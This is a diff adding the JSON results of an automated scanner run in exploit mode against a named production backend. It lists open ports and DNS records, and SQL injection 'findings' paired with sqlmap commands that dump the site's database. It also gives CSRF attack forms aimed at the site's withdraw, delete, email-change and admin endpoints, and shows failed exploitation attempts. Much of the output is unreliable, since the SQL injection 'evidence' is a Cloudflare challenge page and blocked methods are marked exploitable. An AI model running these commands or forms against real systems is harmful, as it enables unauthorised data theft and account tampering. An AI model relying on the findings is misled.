@@ -1,0 +1,446 @@
+{
+  "scan_id": "809909fbf0cc",
+  "timestamp": "2026-07-05T20:42:24.115251",
+  "target": "https://backend.rugs.fun",
+  "config": {
+    "full_scan": true,
+    "exploit": true,
+    "threads": 10,
+    "timeout": 30
+  },
+  "recon": {
+    "target": "https://backend.rugs.fun",
+    "timestamp": "2026-07-05T20:42:24.115311",
+    "subdomains": [],
+    "open_ports": [
+      {
+        "port": 80,
+        "service": "HTTP",
+        "state": "open"
+      },
+      {
+        "port": 443,
+        "service": "HTTPS",
+        "state": "open"
+      },
+      {
+        "port": 8080,
+        "service": "HTTP-Alt",
+        "state": "open"
+      },
+      {
+        "port": 8443,
+        "service": "HTTPS-Alt",
+        "state": "open"
+      }
+    ],
+    "technologies": {
+      "server": [
+        "cloudflare"
+      ],
+      "framework": [],
+      "cms": [],
+      "cdn": [
+        "Cloudflare"
+      ],
+      "javascript": [],
+      "analytics": []
+    },
+    "dns_records": {
+      "A": [
+        "172.66.148.87",
+        "104.20.23.203"
+      ],
+      "MX": [],
+      "TXT": []
+    },
+    "ssl_info": {
+      "valid": true,
+      "issuer": {
+        "countryName": "US",
+        "organizationName": "Google Trust Services",
+        "commonName": "WE1"
+      },
+      "expiry": "Oct  3 17:26:13 2026 GMT",
+      "subject": {
+        "commonName": "rugs.fun"
+      }
+    }
+  },
+  "vulnerabilities": [
+    {
+      "type": "MISSING_SECURITY_HEADER",
+      "severity": "HIGH",
+      "location": "HTTP Headers",
+      "payload": null,
+      "evidence": null,
+      "description": "Missing security header: HSTS",
+      "remediation": "Add Strict-Transport-Security header to responses",
+      "cve": null,
+      "exploitable": false,
+      "exploit_code": null,
+      "timestamp": "2026-07-05T20:42:46.510762"
+    },
+    {
+      "type": "MISSING_SECURITY_HEADER",
+      "severity": "MEDIUM",
+      "location": "HTTP Headers",
+      "payload": null,
+      "evidence": null,
+      "description": "Missing security header: Clickjacking Protection",
+      "remediation": "Add X-Frame-Options header to responses",
+      "cve": null,
+      "exploitable": false,
+      "exploit_code": null,
+      "timestamp": "2026-07-05T20:42:46.510780"
+    },
+    {
+      "type": "MISSING_SECURITY_HEADER",
+      "severity": "LOW",
+      "location": "HTTP Headers",
+      "payload": null,
+      "evidence": null,
+      "description": "Missing security header: XSS Protection",
+      "remediation": "Add X-XSS-Protection header to responses",
+      "cve": null,
+      "exploitable": false,
+      "exploit_code": null,
+      "timestamp": "2026-07-05T20:42:46.510785"
+    },
+    {
+      "type": "MISSING_SECURITY_HEADER",
+      "severity": "LOW",
+      "location": "HTTP Headers",
+      "payload": null,
+      "evidence": null,
+      "description": "Missing security header: Referrer Policy",
+      "remediation": "Add Referrer-Policy header to responses",
+      "cve": null,
+      "exploitable": false,
+      "exploit_code": null,
+      "timestamp": "2026-07-05T20:42:46.510789"
+    },
+    {
+      "type": "DANGEROUS_HTTP_METHOD",
+      "severity": "HIGH",
+      "location": "HTTP Methods",
+      "payload": null,
+      "evidence": "DELETE returned 429",
+      "description": "Dangerous HTTP method allowed: DELETE",
+      "remediation": "Disable DELETE method if not required",
+      "cve": null,
+      "exploitable": true,
+      "exploit_code": null,
+      "timestamp": "2026-07-05T20:42:48.589099"
+    },
+    {
+      "type": "DANGEROUS_HTTP_METHOD",
+      "severity": "MEDIUM",
+      "location": "HTTP Methods",
+      "payload": null,
+      "evidence": "CONNECT returned 400",
+      "description": "Dangerous HTTP method allowed: CONNECT",
+      "remediation": "Disable CONNECT method if not required",
+      "cve": null,
+      "exploitable": true,
+      "exploit_code": null,
+      "timestamp": "2026-07-05T20:42:48.833056"
+    },
+    {
+      "type": "DANGEROUS_HTTP_METHOD",
+      "severity": "MEDIUM",
+      "location": "HTTP Methods",
+      "payload": null,
+      "evidence": "OPTIONS returned 204",
+      "description": "Dangerous HTTP method allowed: OPTIONS",
+      "remediation": "Disable OPTIONS method if not required",
+      "cve": null,
+      "exploitable": true,
+      "exploit_code": null,
+      "timestamp": "2026-07-05T20:42:49.433689"
+    },
+    {
+      "type": "SQLI_ERROR_BASED",
+      "severity": "CRITICAL",
+      "location": "/api/user?user=",
+      "payload": "' OR '1'='1'/*",
+      "evidence": "<!DOCTYPE html><html lang=\"en-US\"><head><title>Just a moment...</title><meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\"><meta http-equiv=\"X-UA-Compatible\" content=\"IE=Edge\"><meta name=\"robots\" content=\"noindex,nofollow\"><meta name=\"viewport\" content=\"width=device-width,initial-scal",
+      "description": "SQL Injection detected via parameter: user",
+      "remediation": "Use parameterized queries, never concatenate user input",
+      "cve": null,
+      "exploitable": true,
+      "exploit_code": "sqlmap -u 'https://backend.rugs.fun/api/user?user=%27%20OR%20%271%27%3D%271%27/%2A' --batch --dump",
+      "timestamp": "2026-07-05T20:43:39.586001"
+    },
+    {
+      "type": "SQLI_ERROR_BASED",
+      "severity": "CRITICAL",
+      "location": "/api/user?username=",
+      "payload": "' OR '1'='1'--",
+      "evidence": "<!DOCTYPE html><html lang=\"en-US\"><head><title>Just a moment...</title><meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\"><meta http-equiv=\"X-UA-Compatible\" content=\"IE=Edge\"><meta name=\"robots\" content=\"noindex,nofollow\"><meta name=\"viewport\" content=\"width=device-width,initial-scal",
+      "description": "SQL Injection detected via parameter: username",
+      "remediation": "Use parameterized queries, never concatenate user input",
+      "cve": null,
+      "exploitable": true,
+      "exploit_code": "sqlmap -u 'https://backend.rugs.fun/api/user?username=%27%20OR%20%271%27%3D%271%27--' --batch --dump",
+      "timestamp": "2026-07-05T20:43:39.727816"
+    },
+    {
+      "type": "SQLI_ERROR_BASED",
+      "severity": "CRITICAL",
+      "location": "/api/auth?id=",
+      "payload": "1' OR '1' = '1",
+      "evidence": "<!DOCTYPE html><html lang=\"en-US\"><head><title>Just a moment...</title><meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\"><meta http-equiv=\"X-UA-Compatible\" content=\"IE=Edge\"><meta name=\"robots\" content=\"noindex,nofollow\"><meta name=\"viewport\" content=\"width=device-width,initial-scal",
+      "description": "SQL Injection detected via parameter: id",
+      "remediation": "Use parameterized queries, never concatenate user input",
+      "cve": null,
+      "exploitable": true,
+      "exploit_code": "sqlmap -u 'https://backend.rugs.fun/api/auth?id=1%27%20OR%20%271%27%20%3D%20%271' --batch --dump",
+      "timestamp": "2026-07-05T20:43:40.785884"
+    },
+    {
+      "type": "SQLI_ERROR_BASED",
+      "severity": "CRITICAL",
+      "location": "/api/auth?username=",
+      "payload": "' OR 'x'='x",
+      "evidence": "<!DOCTYPE html><html lang=\"en-US\"><head><title>Just a moment...</title><meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\"><meta http-equiv=\"X-UA-Compatible\" content=\"IE=Edge\"><meta name=\"robots\" content=\"noindex,nofollow\"><meta name=\"viewport\" content=\"width=device-width,initial-scal",
+      "description": "SQL Injection detected via parameter: username",
+      "remediation": "Use parameterized queries, never concatenate user input",
+      "cve": null,
+      "exploitable": true,
+      "exploit_code": "sqlmap -u 'https://backend.rugs.fun/api/auth?username=%27%20OR%20%27x%27%3D%27x' --batch --dump",
+      "timestamp": "2026-07-05T20:43:43.282626"
+    },
+    {
+      "type": "SQLI_ERROR_BASED",
+      "severity": "CRITICAL",
+      "location": "/user?id=",
+      "payload": "' OR 'x'='x",
+      "evidence": "<!DOCTYPE html><html lang=\"en-US\"><head><title>Just a moment...</title><meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\"><meta http-equiv=\"X-UA-Compatible\" content=\"IE=Edge\"><meta name=\"robots\" content=\"noindex,nofollow\"><meta name=\"viewport\" content=\"width=device-width,initial-scal",
+      "description": "SQL Injection detected via parameter: id",
+      "remediation": "Use parameterized queries, never concatenate user input",
+      "cve": null,
+      "exploitable": true,
+      "exploit_code": "sqlmap -u 'https://backend.rugs.fun/user?id=%27%20OR%20%27x%27%3D%27x' --batch --dump",
+      "timestamp": "2026-07-05T20:43:44.472917"
+    },
+    {
+      "type": "SQLI_ERROR_BASED",
+      "severity": "CRITICAL",
+      "location": "/login?id=",
+      "payload": "1' OR '1' = '1",
+      "evidence": "<!DOCTYPE html><html lang=\"en-US\"><head><title>Just a moment...</title><meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\"><meta http-equiv=\"X-UA-Compatible\" content=\"IE=Edge\"><meta name=\"robots\" content=\"noindex,nofollow\"><meta name=\"viewport\" content=\"width=device-width,initial-scal",
+      "description": "SQL Injection detected via parameter: id",
+      "remediation": "Use parameterized queries, never concatenate user input",
+      "cve": null,
+      "exploitable": true,
+      "exploit_code": "sqlmap -u 'https://backend.rugs.fun/login?id=1%27%20OR%20%271%27%20%3D%20%271' --batch --dump",
+      "timestamp": "2026-07-05T20:43:48.162319"
+    },
+    {
+      "type": "SQLI_ERROR_BASED",
+      "severity": "CRITICAL",
+      "location": "/login?user=",
+      "payload": "' OR '1'='1'/*",
+      "evidence": "<!DOCTYPE html><html lang=\"en-US\"><head><title>Just a moment...</title><meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\"><meta http-equiv=\"X-UA-Compatible\" content=\"IE=Edge\"><meta name=\"robots\" content=\"noindex,nofollow\"><meta name=\"viewport\" content=\"width=device-width,initial-scal",
+      "description": "SQL Injection detected via parameter: user",
+      "remediation": "Use parameterized queries, never concatenate user input",
+      "cve": null,
+      "exploitable": true,
+      "exploit_code": "sqlmap -u 'https://backend.rugs.fun/login?user=%27%20OR%20%271%27%3D%271%27/%2A' --batch --dump",
+      "timestamp": "2026-07-05T20:43:48.467479"
+    },
+    {
+      "type": "SQLI_ERROR_BASED",
+      "severity": "CRITICAL",
+      "location": "/login?username=",
+      "payload": "' OR 1=1--",
+      "evidence": "<!DOCTYPE html><html lang=\"en-US\"><head><title>Just a moment...</title><meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\"><meta http-equiv=\"X-UA-Compatible\" content=\"IE=Edge\"><meta name=\"robots\" content=\"noindex,nofollow\"><meta name=\"viewport\" content=\"width=device-width,initial-scal",
+      "description": "SQL Injection detected via parameter: username",
+      "remediation": "Use parameterized queries, never concatenate user input",
+      "cve": null,
+      "exploitable": true,
+      "exploit_code": "sqlmap -u 'https://backend.rugs.fun/login?username=%27%20OR%201%3D1--' --batch --dump",
+      "timestamp": "2026-07-05T20:43:49.166934"
+    },
+    {
+      "type": "SQLI_ERROR_BASED",
+      "severity": "CRITICAL",
+      "location": "/search?id=",
+      "payload": "1' OR '1' = '1",
+      "evidence": "<!DOCTYPE html><html lang=\"en-US\"><head><title>Just a moment...</title><meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\"><meta http-equiv=\"X-UA-Compatible\" content=\"IE=Edge\"><meta name=\"robots\" content=\"noindex,nofollow\"><meta name=\"viewport\" content=\"width=device-width,initial-scal",
+      "description": "SQL Injection detected via parameter: id",
+      "remediation": "Use parameterized queries, never concatenate user input",
+      "cve": null,
+      "exploitable": true,
+      "exploit_code": "sqlmap -u 'https://backend.rugs.fun/search?id=1%27%20OR%20%271%27%20%3D%20%271' --batch --dump",
+      "timestamp": "2026-07-05T20:43:50.214339"
+    },
+    {
+      "type": "CSRF_MISSING_TOKEN",
+      "severity": "HIGH",
+      "location": "/api/withdraw",
+      "payload": null,
+      "evidence": null,
+      "description": "Endpoint accepts state changes without CSRF token",
+      "remediation": "Implement CSRF tokens on all state-changing operations",
+      "cve": null,
+      "exploitable": true,
+      "exploit_code": "<form action='https://backend.rugs.fun/api/withdraw' method='POST'><input name='test' value='data'><input type='submit'></form>",
+      "timestamp": "2026-07-05T20:44:09.308702"
+    },
+    {
+      "type": "CSRF_MISSING_TOKEN",
+      "severity": "HIGH",
+      "location": "/api/delete",
+      "payload": null,
+      "evidence": null,
+      "description": "Endpoint accepts state changes without CSRF token",
+      "remediation": "Implement CSRF tokens on all state-changing operations",
+      "cve": null,
+      "exploitable": true,
+      "exploit_code": "<form action='https://backend.rugs.fun/api/delete' method='POST'><input name='test' value='data'><input type='submit'></form>",
+      "timestamp": "2026-07-05T20:44:09.447889"
+    },
+    {
+      "type": "CSRF_MISSING_TOKEN",
+      "severity": "HIGH",
+      "location": "/api/update",
+      "payload": null,
+      "evidence": null,
+      "description": "Endpoint accepts state changes without CSRF token",
+      "remediation": "Implement CSRF tokens on all state-changing operations",
+      "cve": null,
+      "exploitable": true,
+      "exploit_code": "<form action='https://backend.rugs.fun/api/update' method='POST'><input name='test' value='data'><input type='submit'></form>",
+      "timestamp": "2026-07-05T20:44:09.589064"
+    },
+    {
+      "type": "CSRF_MISSING_TOKEN",
+      "severity": "HIGH",
+      "location": "/api/change-email",
+      "payload": null,
+      "evidence": null,
+      "description": "Endpoint accepts state changes without CSRF token",
+      "remediation": "Implement CSRF tokens on all state-changing operations",
+      "cve": null,
+      "exploitable": true,
+      "exploit_code": "<form action='https://backend.rugs.fun/api/change-email' method='POST'><input name='test' value='data'><input type='submit'></form>",
+      "timestamp": "2026-07-05T20:44:10.298925"
+    },
+    {
+      "type": "CSRF_MISSING_TOKEN",
+      "severity": "HIGH",
+      "location": "/profile/update",
+      "payload": null,
+      "evidence": null,
+      "description": "Endpoint accepts state changes without CSRF token",
+      "remediation": "Implement CSRF tokens on all state-changing operations",
+      "cve": null,
+      "exploitable": true,
+      "exploit_code": "<form action='https://backend.rugs.fun/profile/update' method='POST'><input name='test' value='data'><input type='submit'></form>",
+      "timestamp": "2026-07-05T20:44:10.446079"
+    },
+    {
+      "type": "CSRF_MISSING_TOKEN",
+      "severity": "HIGH",
+      "location": "/settings/change",
+      "payload": null,
+      "evidence": null,
+      "description": "Endpoint accepts state changes without CSRF token",
+      "remediation": "Implement CSRF tokens on all state-changing operations",
+      "cve": null,
+      "exploitable": true,
+      "exploit_code": "<form action='https://backend.rugs.fun/settings/change' method='POST'><input name='test' value='data'><input type='submit'></form>",
+      "timestamp": "2026-07-05T20:44:10.577582"
+    },
+    {
+      "type": "CSRF_MISSING_TOKEN",
+      "severity": "HIGH",
+      "location": "/admin/update",
+      "payload": null,
+      "evidence": null,
+      "description": "Endpoint accepts state changes without CSRF token",
+      "remediation": "Implement CSRF tokens on all state-changing operations",
+      "cve": null,
+      "exploitable": true,
+      "exploit_code": "<form action='https://backend.rugs.fun/admin/update' method='POST'><input name='test' value='data'><input type='submit'></form>",
+      "timestamp": "2026-07-05T20:44:11.314805"
+    }
+  ],
+  "exploits": [
+    {
+      "vulnerability_type": "SQLI_ERROR_BASED",
+      "success": false,
+      "data_extracted": {},
+      "access_gained": null,
+      "error": "No data extracted",
+      "timestamp": "2026-07-05T20:44:53.051658"
+    },
+    {
+      "vulnerability_type": "SQLI_ERROR_BASED",
+      "success": false,
+      "data_extracted": {},
+      "access_gained": null,
+      "error": "No data extracted",
+      "timestamp": "2026-07-05T20:44:53.528851"
+    },
+    {
+      "vulnerability_type": "SQLI_ERROR_BASED",
+      "success": false,
+      "data_extracted": {},
+      "access_gained": null,
+      "error": "No data extracted",
+      "timestamp": "2026-07-05T20:44:54.025575"
+    },
+    {
+      "vulnerability_type": "SQLI_ERROR_BASED",
+      "success": false,
+      "data_extracted": {},
+      "access_gained": null,
+      "error": "No data extracted",
+      "timestamp": "2026-07-05T20:44:54.507866"
+    },
+    {
+      "vulnerability_type": "SQLI_ERROR_BASED",
+      "success": false,
+      "data_extracted": {},
+      "access_gained": null,
+      "error": "No data extracted",
+      "timestamp": "2026-07-05T20:44:54.977098"
+    },
+    {
+      "vulnerability_type": "SQLI_ERROR_BASED",
+      "success": false,
+      "data_extracted": {},
+      "access_gained": null,
+      "error": "No data extracted",
+      "timestamp": "2026-07-05T20:44:55.454202"
+    },
+    {
+      "vulnerability_type": "SQLI_ERROR_BASED",
+      "success": false,
+      "data_extracted": {},
+      "access_gained": null,
+      "error": "No data extracted",
+      "timestamp": "2026-07-05T20:44:55.930982"
+    },
+    {
+      "vulnerability_type": "SQLI_ERROR_BASED",
+      "success": false,
+      "data_extracted": {},
+      "access_gained": null,
+      "error": "No data extracted",
+      "timestamp": "2026-07-05T20:44:56.421173"
+    },
+    {
+      "vulnerability_type": "SQLI_ERROR_BASED",
+      "success": false,
+      "data_extracted": {},
+      "access_gained": null,
+      "error": "No data extracted",
+      "timestamp": "2026-07-05T20:44:56.895852"
+    }
+  ],
+  "reports": {}
+}
